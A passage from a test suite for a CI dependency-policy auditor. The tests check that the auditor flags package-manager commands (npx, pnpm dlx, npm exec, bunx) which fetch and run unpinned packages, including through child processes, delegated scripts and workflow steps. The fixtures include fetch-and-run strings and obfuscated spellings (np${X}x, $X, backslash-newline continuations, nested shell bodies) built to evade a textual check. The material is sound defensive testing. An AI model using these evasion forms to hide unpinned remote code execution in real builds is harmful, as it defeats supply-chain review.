    'scripts/ci/run.sh: executable command name uses shell expansion: ${RUNNER[@]}',
    'scripts/ci/run.sh: executable command name uses shell expansion: ./bin/$PM',
    'scripts/ci/run.sh: executable command name uses shell expansion: np${X}x',
  ])
})

test('delegated script audit follows node into the JavaScript it runs and audits the commands it hands to child processes', () => {
  const audit = auditDelegatedFixture('dependency-policy-delegated-node-', {
    'package.json': `${JSON.stringify(
      {
        scripts: {
          lint: 'node scripts/lint.mjs --repo-only',
          smoke: '/usr/bin/node ./scripts/spawn.mjs',
          shebang: 'nodejs scripts/tool',
          typed: 'tsx scripts/typed.ts',
        },
      },
      null,
      2
    )}\n`,
    // The shape the review thread named: a tracked script the manifest runs
    // through node, handing an unpinned package to a shell.
    'scripts/lint.mjs': [
      "import { execSync } from 'node:child_process'",
      "execSync('npx mutable-tool@latest')",
      '',
    ].join('\n'),
    // Array arguments are joined into one command; a pinned runner passes.
    'scripts/spawn.mjs': [
      "import { spawnSync } from 'node:child_process'",
      "spawnSync('npx', ['spawn-tool@latest'])",
      "spawnSync('corepack', ['pnpm', 'build:chrome:mv3'])",
      "await $`npm exec -- zx-tool@latest`",
      '',
    ].join('\n'),
    // Extensionless, so only the shebang marks it as JavaScript.
    'scripts/tool': [
      '#!/usr/bin/env node',
      "const cp = require('child_process')",
      "cp.execFileSync('pnpm', ['dlx', 'shebang-tool@latest'])",
      '',
    ].join('\n'),
    // Parsed with the TypeScript grammar, where the annotation is not an error.
    'scripts/typed.ts': [
      "import { execa } from 'execa'",
      "const runner: string = 'npx'",
      "await execa(runner, ['typed-tool@1.0.0'])",
      "await execa('bunx', ['typed-tool@latest'])",
      '',
    ].join('\n'),
    // Named by nothing the repository runs, so it must stay out of the audit.
    'scripts/unreferenced.mjs': [
      "import { execSync } from 'node:child_process'",
      "execSync('npx unreferenced-tool@latest')",
      '',
    ].join('\n'),
  })

  assert.deepEqual(audit.discoveryErrors, [])
  assert.deepEqual(audit.scripts.sort(), [
    'scripts/lint.mjs',
    'scripts/spawn.mjs',
    'scripts/tool',
    'scripts/typed.ts',
  ])
  assert.deepEqual(audit.auditErrors.sort(), [
    'scripts/lint.mjs: executable package is not pinned to an exact version: mutable-tool@latest',
    'scripts/spawn.mjs: executable package is not pinned to an exact version: spawn-tool@latest',
    'scripts/spawn.mjs: executable package is not pinned to an exact version: zx-tool@latest',
    'scripts/tool: executable package is not pinned to an exact version: shebang-tool@latest',
    'scripts/typed.ts: executable package is not pinned to an exact version: typed-tool@latest',
  ])
})

test('delegated script audit expands node test globs against the tracked files of the delegating directory', () => {
  const audit = auditDelegatedFixture('dependency-policy-delegated-glob-', {
    'apps/extension/package.json': `${JSON.stringify(
      { scripts: { test: 'node --test ./scripts/*.test.js && vitest run' } },
      null,
      2
    )}\n`,
    'package.json': `${JSON.stringify(
      {
        scripts: {
          'test:security-tooling': 'node --test scripts/security/*.test.mjs',
          'test:nested': 'node --test scripts/**/nested.test.mjs',
          'test:missing': 'node --test ./missing/*.test.js',
        },
      },
      null,
      2
    )}\n`,
    'apps/extension/scripts/a.test.js': "require('child_process').execSync('npx a-tool@latest')\n",
    'apps/extension/scripts/b.test.js': "console.log('no child process here')\n",
    // Matches the workspace glob only from the repository root, where nothing
    // runs it, and the helper matches nothing at all.
    'scripts/a.test.js': "require('child_process').execSync('npx root-tool@latest')\n",
    'apps/extension/scripts/helper.js': "require('child_process').execSync('npx helper-tool@latest')\n",
    'scripts/security/policy.test.mjs': [
      "import { execFileSync } from 'node:child_process'",
      "execFileSync('npm', ['exec', '--', 'security-tool@latest'])",
      '',
    ].join('\n'),
    'scripts/security/deep/nested.test.mjs': [
      "import { execFileSync } from 'node:child_process'",
      "execFileSync('npm', ['exec', '--', 'nested-tool@latest'])",
      '',
    ].join('\n'),
  })

  assert.deepEqual(audit.discoveryErrors, [
    'package.json: delegated script is not a tracked repository file: ./missing/*.test.js',
  ])
  assert.deepEqual(audit.scripts.sort(), [
    'apps/extension/scripts/a.test.js',
    'apps/extension/scripts/b.test.js',
    'scripts/security/deep/nested.test.mjs',
    'scripts/security/policy.test.mjs',
  ])
  assert.deepEqual(audit.auditErrors.sort(), [
    'apps/extension/scripts/a.test.js: executable package is not pinned to an exact version: a-tool@latest',
    'scripts/security/deep/nested.test.mjs: executable package is not pinned to an exact version: nested-tool@latest',
    'scripts/security/policy.test.mjs: executable package is not pinned to an exact version: security-tool@latest',
  ])
})

test('delegated script audit reads node options the way node does', () => {
  const audit = auditDelegatedFixture('dependency-policy-delegated-node-options-', {
    '.github/workflows/ci.yml': [
      'jobs:',
      '  build:',
      '    steps:',
      // Inline programs are the workflow's own text: no script to follow.
      '      - run: node -p "require(\'./package.json\').version"',
      "      - run: node -e 'console.log(1)' scripts/not-a-script.mjs",
      '      - run: |',
      '          node --input-type=module <<\'NODE\' >> "$GITHUB_OUTPUT"',
      '          console.log("x=1")',
      '          NODE',
      '      - run: echo "const x = 1" | node -',
      // Value options are skipped with their value; `--` ends option parsing.
      '      - run: node --stack-trace-limit 50 --title worker --test-reporter spec -- scripts/main.mjs --flag scripts/not-a-script.mjs',
      // A preloaded relative module runs before the script and is followed too.
      '      - run: node -r ./scripts/setup.js --import=./scripts/hooks.mjs --require ts-node/register scripts/main.mjs',
      // A script arriving on stdin from a file is still a script.
      '      - run: node < scripts/stdin.mjs',
      // Without a path node discovers tests itself; the audit cannot.
      '      - run: node --test',
      '',
    ].join('\n'),
    'scripts/main.mjs': "import { execSync } from 'node:child_process'\nexecSync('npx main-tool@latest')\n",
    'scripts/setup.js': "require('child_process').execSync('npx setup-tool@latest')\n",
    'scripts/hooks.mjs': "import { execSync } from 'node:child_process'\nexecSync('npx hooks-tool@latest')\n",
    'scripts/stdin.mjs': "import { execSync } from 'node:child_process'\nexecSync('npx stdin-tool@latest')\n",
    'scripts/not-a-script.mjs': "import { execSync } from 'node:child_process'\nexecSync('npx argv-tool@latest')\n",
  })

  assert.deepEqual(audit.discoveryErrors, [
    '.github/workflows/ci.yml: delegated test files are discovered at run time and cannot be enumerated: node --test',
  ])
  assert.deepEqual(audit.scripts.sort(), [
    'scripts/hooks.mjs',
    'scripts/main.mjs',
    'scripts/setup.js',
    'scripts/stdin.mjs',
  ])
  assert.deepEqual(audit.auditErrors.sort(), [
    'scripts/hooks.mjs: executable package is not pinned to an exact version: hooks-tool@latest',
    'scripts/main.mjs: executable package is not pinned to an exact version: main-tool@latest',
    'scripts/setup.js: executable package is not pinned to an exact version: setup-tool@latest',
    'scripts/stdin.mjs: executable package is not pinned to an exact version: stdin-tool@latest',
  ])

  // An unknown option's value is read as the script and fails closed; the
  // fix is to add the option to the value set, never to guess.
  const unknown = auditDelegatedFixture('dependency-policy-delegated-node-unknown-option-', {
    'package.json': `${JSON.stringify(
      { scripts: { run: 'node --future-option value scripts/main.mjs' } },
      null,
      2
    )}\n`,
    'scripts/main.mjs': "import { execSync } from 'node:child_process'\nexecSync('npx main-tool@latest')\n",
  })
  assert.deepEqual(unknown.discoveryErrors, [
    'package.json: delegated script is not a tracked repository file: value',
  ])
  assert.deepEqual(unknown.scripts, [])
})

test('delegated script audit walks on from JavaScript into the scripts it runs', () => {
  const audit = auditDelegatedFixture('dependency-policy-delegated-node-chain-', {
    'package.json': `${JSON.stringify({ scripts: { run: 'node scripts/run.mjs' } }, null, 2)}\n`,
    'scripts/run.mjs': [
      "import { execSync, spawnSync } from 'node:child_process'",
      "import { join } from 'node:path'",
      "spawnSync('bash', ['scripts/ci/x.sh'])",
      "execSync('./scripts/ci/y.sh')",
      "spawnSync('node', [join(root, 'scripts/other.mjs')])",
      "execSync(`node ${join(root, 'scripts/dynamic.mjs')}`)",
      '',
    ].join('\n'),
    'scripts/ci/x.sh': '#!/usr/bin/env bash\nnpx x-tool@latest\n',
    'scripts/ci/y.sh': '#!/usr/bin/env bash\nnpx y-tool@latest\n',
    // Delegates back to the entrypoint, so the walk has to break the cycle.
    'scripts/other.mjs': [
      "import { execSync } from 'node:child_process'",
      "execSync('npx other-tool@latest')",
      "execSync('node scripts/run.mjs')",
      '',
    ].join('\n'),
    // Reached only through a substituted path, which the walk cannot follow.
    'scripts/dynamic.mjs': "import { execSync } from 'node:child_process'\nexecSync('npx dynamic-tool@latest')\n",
  })

  assert.deepEqual(audit.discoveryErrors, [])
  assert.deepEqual(audit.scripts.sort(), [
    'scripts/ci/x.sh',
    'scripts/ci/y.sh',
    'scripts/other.mjs',
    'scripts/run.mjs',
  ])
  assert.deepEqual(audit.auditErrors.sort(), [
    'scripts/ci/x.sh: executable package is not pinned to an exact version: x-tool@latest',
    'scripts/ci/y.sh: executable package is not pinned to an exact version: y-tool@latest',
    'scripts/other.mjs: executable package is not pinned to an exact version: other-tool@latest',
  ])
})

test('delegated script audit reads only the text JavaScript hands to child processes', () => {
  const audit = auditDelegatedFixture('dependency-policy-delegated-node-literal-', {
    'package.json': `${JSON.stringify(
      { scripts: { test: 'node --test scripts/policy.test.mjs', smoke: 'node scripts/smoke.mjs' } },
      null,
      2
    )}\n`,
    // A test file full of unpinned fixture strings, none handed to a child
    // process, must stay green: this is what keeps the real gate passing.
    'scripts/policy.test.mjs': [
      "import assert from 'node:assert/strict'",
      "import { execFileSync } from 'node:child_process'",
      "import test from 'node:test'",
      "import { audit } from './policy.mjs'",
      "const fixture = 'npm exec -- fixture-tool@latest'",
      "test('rejects mutable tools', () => {",
      "  assert.deepEqual(audit(['npx mutable-tool@latest', fixture]), [",
      "    'executable package is not pinned to an exact version: mutable-tool@latest',",
      '  ])',
      "  execFileSync('git', ['init', '-q'], { cwd: repoRoot })",
      "  const pattern = /npx (\\S+)/.exec('npx regex-tool@latest')",
      '})',
      '',
    ].join('\n'),
    'scripts/smoke.mjs': [
      "import { execSync, spawn, spawnSync } from 'node:child_process'",
      // A substituted executable name is a dynamic command name.
      'execSync(`${runner} tool@1.0.0`)',
      // A computed program with literal arguments is outside the textual
      // audit; its arguments are never read as the executable.
      "spawn(chromePath, [`--user-data-dir=${profileDir}`, '--headless=new'], { stdio: 'inherit' })",
      // A computed script operand cannot be resolved and is not an error.
      "spawnSync('bash', [cli, 'getblockchaininfo'], { encoding: 'utf8' })",
      // A computed argument after a manager still fails closed.
      "spawnSync('npx', [tool])",
      // Nothing literal at all contributes nothing.
      'spawnSync(command, args)',
      // An options object is not command text: its strings are never read as
      // operands (under `--test` they would be test paths), while its `env`
      // entries reach the child as assignments and are audited as such.
      "spawnSync('node', ['--test', 'scripts/policy.test.mjs'], { encoding: 'utf8', stdio: 'inherit' })",
      "spawnSync('npm', ['exec', 'tool@1.0.0'], { env: { ...process.env, npm_config_registry: mirror } })",
      '',
    ].join('\n'),
  })

  assert.deepEqual(audit.discoveryErrors, [])
  assert.deepEqual(audit.scripts.sort(), ['scripts/policy.test.mjs', 'scripts/smoke.mjs'])
  assert.deepEqual(audit.auditErrors.sort(), [
    'scripts/smoke.mjs: executable command name uses shell expansion: ${runner}',
    'scripts/smoke.mjs: executable package is not pinned to an exact version: ${tool}',
    'scripts/smoke.mjs: executable package is not pinned to an exact version: npm_config_registry',
  ])
})

test('delegated script audit fails closed on JavaScript it cannot parse', () => {
  const audit = auditDelegatedFixture('dependency-policy-delegated-node-unparsable-', {
    'package.json': `${JSON.stringify({ scripts: { run: 'node scripts/broken.mjs' } }, null, 2)}\n`,
    'scripts/broken.mjs': [
      "import { execSync } from 'node:child_process'",
      "execSync('npx mutable-tool@latest'",
      '',
    ].join('\n'),
  })

  assert.deepEqual(audit.discoveryErrors, [
    "scripts/broken.mjs: delegated JavaScript script cannot be parsed: line 3: ')' expected.",
  ])
  assert.deepEqual(audit.scripts, [])
  assert.deepEqual(audit.auditErrors, [])
})

test('a reviewed dynamic delegation discovers its target with no other root reaching it', () => {
  const repoRoot = resolve(dirname(fileURLToPath(import.meta.url)), '../..')
  const regtest = Object.fromEntries(
    ['env.sh', 'fund', 'mine'].map(name => [
      `scripts/regtest/${name}`,
      readFileSync(join(repoRoot, 'scripts/regtest', name), 'utf8'),
    ])
  )
  // `fund` is the only script any root runs, and it reaches `mine` solely
  // through `bash "$REGTEST_DIR/mine"`, whose target the reviewed record names.
  const manifest = `${JSON.stringify({ scripts: { fund: 'bash scripts/regtest/fund' } }, null, 2)}\n`

  const audit = auditDelegatedFixture('dependency-policy-reviewed-delegation-', {
    ...regtest,
    'package.json': manifest,
  })
  assert.deepEqual(audit.discoveryErrors, [])
  assert.ok(
    audit.scripts.includes('scripts/regtest/mine'),
    `expected scripts/regtest/mine in ${JSON.stringify(audit.scripts)}`
  )
  assert.deepEqual(
    audit.auditErrors.filter(error => error.includes('shell expansion')),
    []
  )

  // Drift in the reviewed script invalidates the record, so the target is no
  // longer discovered and the unresolved delegation is reported again.
  const drifted = auditDelegatedFixture('dependency-policy-reviewed-delegation-drift-', {
    ...regtest,
    'scripts/regtest/fund': `${regtest['scripts/regtest/fund']}\n# edited\n`,
    'package.json': manifest,
  })
  assert.deepEqual(drifted.discoveryErrors, [
    'scripts/regtest/fund: delegated script path is not a literal repository path: $REGTEST_DIR/mine',
  ])
  assert.equal(drifted.scripts.includes('scripts/regtest/mine'), false)

  // The record names a target, so it fails closed once that target stops being
  // a tracked file rather than quietly resolving to nothing.
  const missing = auditDelegatedFixture('dependency-policy-reviewed-delegation-missing-', {
    'scripts/regtest/env.sh': regtest['scripts/regtest/env.sh'],
    'scripts/regtest/fund': regtest['scripts/regtest/fund'],
    'package.json': manifest,
  })
  assert.deepEqual(missing.discoveryErrors, [
    'scripts/regtest/fund: reviewed delegated script target is not a tracked repository file: scripts/regtest/mine',
  ])
})

test('reviewed dynamic reference exceptions are bound to path, token, and script digest', () => {
  const repoRoot = resolve(dirname(fileURLToPath(import.meta.url)), '../..')
  const reviewed = [
    ['scripts/regtest/env.sh', '$QBIT_CLI_BIN'],
  ]
  const expansions = audit => audit.errors.filter(error => error.includes('shell expansion'))

  for (const [file, reference] of reviewed) {
    const source = readFileSync(join(repoRoot, file), 'utf8')
    const expected = [`${file}: executable command name uses shell expansion: ${reference}`]

    // The record covers this script exactly as reviewed.
    assert.deepEqual(
      expansions(auditExecutableDependencyCommands([{ file, commands: [source] }])),
      []
    )
    // Any drift in the script content invalidates the record.
    assert.deepEqual(
      expansions(
        auditExecutableDependencyCommands([{ file, commands: [`${source}\n# edited\n`] }])
      ),
      expected
    )
    // The record is bound to the path, so the same content elsewhere is not covered.
    assert.deepEqual(
      expansions(
        auditExecutableDependencyCommands([{ file: `vendor/${file}`, commands: [source] }])
      ),
      [`vendor/${file}: executable command name uses shell expansion: ${reference}`]
    )
    // Adding an unreviewed dynamic executable is itself drift, so the new
    // executable and the reviewed one are both reported.
    assert.deepEqual(
      expansions(
        auditExecutableDependencyCommands([{ file, commands: [`${source}\n"$UNREVIEWED" run\n`] }])
      ),
      [...expected, `${file}: executable command name uses shell expansion: $UNREVIEWED`]
    )
  }
})

test('executable dependency command audit rejects mutable package and browser tags', () => {
  const audit = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'pnpm dlx @scope/tool@1.2.3 verify',
        'npx unpinned-tool verify',
        'corepack pnpm exec browsers install chrome@stable',
      ],
    },
  ])
  assert.equal(audit.commandCount, 3)
  assert.equal(audit.errors.length, 2)
  assert.match(audit.errors.join('\n'), /unpinned-tool/)
  assert.match(audit.errors.join('\n'), /chrome@stable/)
})

test('executable dependency command audit covers npm exec positional and package forms', () => {
  const audit = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm exec unpinned-tool verify',
        'npm exec -- unpinned-tool@latest verify',
        'npm x @scope/tool verify',
        'npm x -- @scope/tool@^1.2.3 verify',
        'npm exec --package unpinned-tool -- tool',
        'npm x --package=@scope/tool@latest -- tool',
        'npm exec --package=@scope/tool@1.2.3 --package mutable-tool -- tool',
        'npm exec -w workspace-a mutable-tool',
        'npm exec -- tool@1.2.3',
        'npm x -- @scope/tool@1.2.3',
        'npm exec --package @scope/tool@1.2.3 -- tool',
        'npm x --package=@scope/tool@1.2.3 -- tool',
        "npm x -c 'local-tool --flag'",
        'npm exec -- @scope/tool@1.2.3 --package=ignored',
        "npm exec --package=@scope/tool@1.2.3 --call 'custom command'",
        'npm --package=mutable-prefix exec tool@1.2.3',
        'npm --package @scope/tool@latest x tool@1.2.3',
        'npm --package=@scope/tool@1.2.3 exec tool',
        'npm --package=safe@1.2.3 exec --package=mutable-inner -- tool',
      ],
    },
  ])
  assert.equal(audit.commandCount, 19)
  assert.equal(audit.errors.length, 11)
  assert.match(audit.errors.join('\n'), /unpinned-tool/)
  assert.match(audit.errors.join('\n'), /@scope\/tool@latest/)
  assert.match(audit.errors.join('\n'), /mutable-tool/)
  assert.match(audit.errors.join('\n'), /mutable-prefix/)
  assert.match(audit.errors.join('\n'), /mutable-inner/)
})

test('executable dependency command audit covers npm exec call bodies', () => {
  // `npm exec -c`, `npm x --call`, and `npx -c` hand their body to a shell, so
  // the body is audited like `sh -c` whatever quoting carried it.
  const rejected = [
    ["npm exec -c 'npm install -g mutable-call@latest'", /exact version: mutable-call@latest$/m],
    ["npm exec --call 'npx mutable-call'", /exact version: mutable-call$/m],
    ["npm exec --call='pnpm dlx mutable-call'", /exact version: mutable-call$/m],
    ["npm exec -c='yarn dlx mutable-call'", /exact version: mutable-call$/m],
    [
      'npm exec -c npm\\ install\\ -g\\ mutable-call@latest',
      /exact version: mutable-call@latest$/m,
    ],
    ['npm exec --call=npx\\ mutable-call', /exact version: mutable-call$/m],
    ['npm exec -c \'"npm" install -g mutable-call@latest\'', /exact version: "npm"$/m],
    ['npm exec -c \'np""x mutable-call\'', /exact version: np""x$/m],
    ["npm exec -c 'X=npx; $X mutable-call'", /shell expansion: \$X$/m],
    ['npm exec -c \'sh -c "np${X}x mutable-call"\'', /shell expansion: np\$\{X\}x$/m],
    ['npm exec -c \'npm exec -c "npx mutable-call"\'', /exact version: mutable-call$/m],
    ["npx -c 'npm install -g mutable-call@latest'", /exact version: mutable-call@latest$/m],
    ["npm x --call 'bunx mutable-call'", /exact version: mutable-call$/m],
    ["npm exec --package=safe@1.2.3 -c 'npx mutable-call'", /exact version: mutable-call$/m],
    [
      "npm exec -c 'npm install -g mutable-call@latest' && echo done",
      /exact version: mutable-call@latest$/m,
    ],
    ["corepack npm@10.9.8 exec -c 'X=npx; $X mutable-call'", /shell expansion: \$X$/m],
    // An empty call value means no call, so npm fetches the positional package.
    ["npm exec -c '' mutable-call", /exact version: mutable-call$/m],
    ['npm exec --call= mutable-call', /exact version: mutable-call$/m],
    ["npm exec --call='' mutable-call", /exact version: mutable-call$/m],
    ["npm exec -c '' -- mutable-call", /exact version: mutable-call$/m],
  ]
  for (const [command, expected] of rejected) {
    const audit = auditExecutableDependencyCommands([{ file: 'package.json', commands: [command] }])
    assert.match(audit.errors.join('\n'), expected, command)
    // The body is read once with its own quoting, so neither the quote that
    // carried it nor the option that named it surfaces as a package.
    assert.doesNotMatch(
      audit.errors.join('\n'),
      /exact version: (?:['"](?:npm|npx|bunx)|-c=.*|--call=.*)$|safe@1\.2\.3/m,
      command
    )
  }

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        "npm exec -c 'npm install -g pinned-call@1.2.3'",
        "npm exec -c 'npx pinned-call@1.2.3'; echo done",
        "npm exec -c 'npx pinned-call@1.2.3' && echo done",
        "npm exec -c 'npm install -g pinned-call@1.2.3' | tee log",
        "npm exec --call='npx pinned-call@1.2.3'",
        "npm exec -c='npx pinned-call@1.2.3'",
        "npm exec --package=@scope/tool@1.2.3 --call 'custom command'",
        "npm x -c 'local-tool --flag'",
        'npm exec -c \'node tool.js "$ARG"\'',
        'npm exec -c \'echo "$VALUE" | cat\'',
        "npx -c 'npx pinned-call@1.2.3'",
        'npm exec -c \'npm exec -c "npx pinned-call@1.2.3"\'',
        "npm exec -c 'corepack pnpm@8.6.0 add -g pinned-call@1.2.3'",
      ],
    },
  ])
  assert.equal(accepted.commandCount, 13)
  assert.deepEqual(accepted.errors, [])

  // Every body is shorter than the command that carries it, so nesting ends;
  // past the depth cap the innermost body is rejected rather than skipped.
  const wrap = (body, levels) => {
    let command = body
    for (let level = 0; level < levels; level += 1) {
      command = `npm exec -c ${command.replace(/[\\ ]/g, '\\$&')}`
    }
    return command
  }
  const nested = auditExecutableDependencyCommands([
    { file: 'package.json', commands: [wrap('npx pinned-call@1.2.3', 8)] },
  ])
  assert.deepEqual(nested.errors, [])
  const capped = auditExecutableDependencyCommands([
    { file: 'package.json', commands: [wrap('npx pinned-call@1.2.3', 9)] },
  ])
  assert.match(capped.errors.join('\n'), /exact version: npx pinned-call@1\.2\.3$/m)
})

test('executable dependency command audit removes shell line continuations', () => {
  // A backslash-newline pair is deleted before word splitting, so `np\` +
  // newline + `x` spells the runner Bash executes as `npx`.
  const rejected = [
    ['package.json', 'np\\\nx mutable-tool@latest', /exact version: np\\$/m],
    ['package.json', 'np\\\r\nx mutable-tool@latest', /exact version: np\\\r$/m],
    // Double quotes delete the pair the same way.
    ['package.json', '"np\\\nx" mutable-tool@latest', /exact version: "np\\$/m],
    [
      'package.json',
      'npm exec -c "np\\\nx mutable-tool@latest"',
      /exact version: mutable-tool@latest$/m,
    ],
    // Single quotes keep the pair, so the body carries it to the shell that
    // runs it and the recursive audit of that body folds it there.
    ['package.json', "npm exec -c 'np\\\nx mutable-tool@latest'", /exact version: np\\$/m],
    [
      'package.json',
      'npm exec -c \'npm exec -c "np\\\nx mutable-tool@latest"\'',
      /exact version: mutable-tool@latest$/m,
    ],
    // A continued runner survives an install form and a later segment too.
    ['package.json', 'np\\\nm install -g mutable-tool@latest', /exact version: np\\$/m],
    ['package.json', 'echo start && np\\\nx mutable-tool@latest', /exact version: np\\$/m],
    // A YAML block scalar strips the indentation the body is written with, so
    // the continuation only joins in the parsed `run` body.
    [
      '.github/workflows/ci.yml',
      'jobs:\n  build:\n    steps:\n      - run: |\n          np\\\n          x mutable-tool@latest\n',
      /exact version: np\\$/m,
    ],
    [
      '.github/workflows/ci.yml',
      'jobs:\n  build:\n    steps:\n      - run: |\n          np\\\n          x -- mutable-tool@latest\n',
      /exact version: np\\$/m,
    ],
  ]
  for (const [file, command, expected] of rejected) {
    const audit = auditExecutableDependencyCommands([{ file, commands: [command] }])
    assert.match(audit.errors.join('\n'), expected, JSON.stringify(command))
    // The quote that carried a call body is never reported as a package, and
    // neither representation of a workflow body reports the same reference
    // twice.
    assert.doesNotMatch(
      audit.errors.join('\n'),
      /exact version: (?:['"](?:npm|npx)$|-c=|--call=)/m,
      JSON.stringify(command)
    )
    assert.equal(new Set(audit.errors).size, audit.errors.length, JSON.stringify(command))
  }

  // A single-quoted executable spelling is literal: Bash looks for a command
  // named `np<backslash><newline>x`, which is not a package manager.
  const literal = auditExecutableDependencyCommands([
    { file: 'package.json', commands: ["'np\\\nx' mutable-tool@latest"] },
  ])
  assert.deepEqual(literal.errors, [])

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        // A continuation between words leaves both words intact.
        'npx \\\n  tool@1.2.3',
        'npm install -g \\\n  tool@1.2.3',
        // A continuation that trails a runner is not part of its raw span.
        'npx\\\n tool@1.2.3',
        // An escaped backslash is not a continuation, so the newline still
        // ends the command.
        'echo done\\\\\nnpx tool@1.2.3',
        // Ordinary escaped characters keep resolving to the word they spell.
        'npx pinned\\-tool@1.2.3',
        'npx tool@1.2.3 --flag\\ value',
        "npm exec -c 'npx tool@1.2.3'",
        "npm exec -c 'echo a\\nb'",
        'npm exec -c "npx tool@1.2.3"',
      ],
    },
    {
      file: '.github/workflows/ci.yml',
      commands: [
        'jobs:\n  build:\n    steps:\n      - run: |\n          npm install -g \\\n            tool@1.2.3\n',
        'jobs:\n  build:\n    steps:\n      - run: |\n          npx \\\n            tool@1.2.3\n',
      ],
    },
  ])
  assert.deepEqual(accepted, { commandCount: 11, errors: [] })

  // A reference both the raw workflow source and the parsed run body expose is
  // reported once.
  const shared = auditExecutableDependencyCommands([
    {
      file: '.github/workflows/ci.yml',
      commands: ['jobs:\n  build:\n    steps:\n      - run: npx mutable-tool@latest\n'],
    },
  ])
  assert.deepEqual(shared.errors, [
    '.github/workflows/ci.yml: executable package is not pinned to an exact version: mutable-tool@latest',
  ])
})

test('executable dependency command audit covers manager options and fetch-and-run aliases', () => {
  const audit = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'pnpm --silent dlx mutable-tool verify',
        'pnpm --dir . dlx @scope/tool@latest verify',
        'npm --silent exec mutable-tool verify',
        'npm --prefix . x -- mutable-tool verify',
        'npx --yes mutable-tool verify',
        'npx -p mutable-tool command',
        'yarn dlx mutable-tool verify',
        'bunx mutable-tool verify',
        'pnpm --silent dlx @scope/tool@1.2.3 verify',
        'npm --silent exec -- @scope/tool@1.2.3 verify',
        'npx --yes @scope/tool@1.2.3 verify',
        'npx -p @scope/tool@1.2.3 command',
        'yarn dlx @scope/tool@1.2.3 verify',
        'bunx @scope/tool@1.2.3 verify',
      ],
    },
  ])
  assert.equal(audit.commandCount, 14)
  assert.equal(audit.errors.length, 10)
  assert.match(audit.errors.join('\n'), /@scope\/tool@latest/)
  assert.match(audit.errors.join('\n'), /mutable-tool/)
  assert.match(audit.errors.join('\n'), /--dir/)
  assert.match(audit.errors.join('\n'), /--prefix/)
})

test('executable dependency command audit rejects shell expansion in the executable name', () => {
  const rejected = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'X=; np${X}x mutable-tool@latest',
        'X=npx; $X mutable-tool@latest',
        'X=npx; "$X" mutable-tool@latest',
        'X=npx && ${X} mutable-tool@latest',
        '$(printf npx) mutable-tool@latest',
        '`printf npx` mutable-tool@latest',
        'X=npx; ./bin/$X mutable-tool@latest',
        'env X=1 np${X}x mutable-tool@latest',
        'env -u HOME $PM dlx mutable-tool@latest',
        'corepack ${PM} dlx mutable-tool@latest',
        'if $X mutable-tool@latest; then echo ok; fi',
        'echo start && $X mutable-tool@latest',
        'echo start | xargs $X',
        'sh -c "np${X}x mutable-tool@latest"',
        "bash -lc 'X=; np${X}x mutable-tool@latest'",
        'eval np${X}x mutable-tool@latest',
        'timeout 30 $X mutable-tool@latest',
        'xvfb-run --auto-servernum $X mutable-tool@latest',
        "$'npx' mutable-tool@latest",
        "node <<'NODE'\nconsole.log(`${process.env.X}`)\nNODE\n$X mutable-tool@latest",
        'args=(--flag "$VALUE")\n$X mutable-tool@latest',
        '[[ "$a" == b || "$a" == c ]] || $X mutable-tool@latest',
      ],
    },
    {
      file: '.github/workflows/expansion.yml',
      commands: [
        'steps:\n  - run: ${{ matrix.runner }} mutable-tool@latest',
        'steps:\n  - run: |\n      set -euo pipefail\n      X=\n      np${X}x mutable-tool@latest\n',
      ],
    },
  ])
  assert.equal(rejected.commandCount, 24)
  assert.equal(rejected.errors.length, 27)
  assert.equal(rejected.errors.filter(error => error.includes('shell expansion')).length, 24)
  assert.match(rejected.errors.join('\n'), /shell expansion: np\$\{X\}x/)
  assert.match(rejected.errors.join('\n'), /shell expansion: \$X$/m)
  assert.match(rejected.errors.join('\n'), /shell expansion: \$\{X\}$/m)
  assert.match(rejected.errors.join('\n'), /shell expansion: \$\(printf$/m)
  assert.match(rejected.errors.join('\n'), /shell expansion: `printf$/m)
  assert.match(rejected.errors.join('\n'), /shell expansion: \.\/bin\/\$X$/m)
  assert.match(rejected.errors.join('\n'), /shell expansion: \$PM$/m)
  assert.match(rejected.errors.join('\n'), /shell expansion: \$\{PM\}$/m)
  assert.match(rejected.errors.join('\n'), /shell expansion: \$npx$/m)
  assert.match(rejected.errors.join('\n'), /expansion\.yml: .*shell expansion: \$\{\{$/m)

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'artifact_version="$(node -p 1)"',
        'echo "artifact_version=${artifact_version}" >> "$GITHUB_OUTPUT"',
        '"$RUNNER_TEMP/tool.sh" --flag "$VALUE"',
        '${GITHUB_WORKSPACE}/scripts/run.sh',
        'node "$SCRIPT" && node tool.js "$@"',
        'for f in a b; do echo "$f"; done',
        'X=$(pwd) node tool.js',
        'env NAME="$VALUE" node tool.js',
        'corepack pnpm exec tool@1.2.3 -- "$ARG"',
        'docker build \\\n  --build-arg "X=$Y" .',
        'git diff --no-index -- a "$b" || test "$?" -eq 1',
        'sh -c "node tool.js $ARG"',
        'eval node tool.js "$ARG"',
        '[ -f "$FILE" ] && cat "$FILE"',
        '{ node tool.js "$ARG"; }',
        'timeout 30s node tool.js',
        'expected=()\nif [ "$A" = "$B" ]; then\n  expected=(--expected-commit "$PIN_COMMIT")\nfi\nnode verify.mjs "${expected[@]}"',
        'if [[ "$image" == *$\'\\n\'* || "$image" == *$\'\\r\'* ]]; then\n  exit 1\nfi',
        "node --input-type=module <<'NODE' >> \"$GITHUB_OUTPUT\"\nconsole.log(`release=${release}`)\nconsole.log(`commit=${pin.commit}`)\nNODE\necho done",
        'cat <<EOF\n$BODY\nEOF',
        'cat <<-EOF\n\t$BODY\n\tEOF\nnode tool.js',
      ],
    },
    {
      file: '.github/workflows/expansion.yml',
      commands: [
        'env:\n  TOKEN: ${{ secrets.TOKEN }}\nsteps:\n  - run: |\n      node <<\'NODE\'\n      const x = `${process.env.TOKEN}`\n      for (const n of [1]) {\n        console.log(n)\n      }\n      NODE\n  - run: >-\n      cmp a.json\n      "$RUNNER_TEMP/b.json"',
      ],
    },
  ])
  assert.deepEqual(accepted, { commandCount: 22, errors: [] })
})

test('executable dependency command audit rejects brace expansion around the command word', () => {
  // Bash expands brace groups before it resolves the program, so a group in
  // the executable or in the manager's command word runs a package manager the
  // textual audit never reads.
  const rejected = [
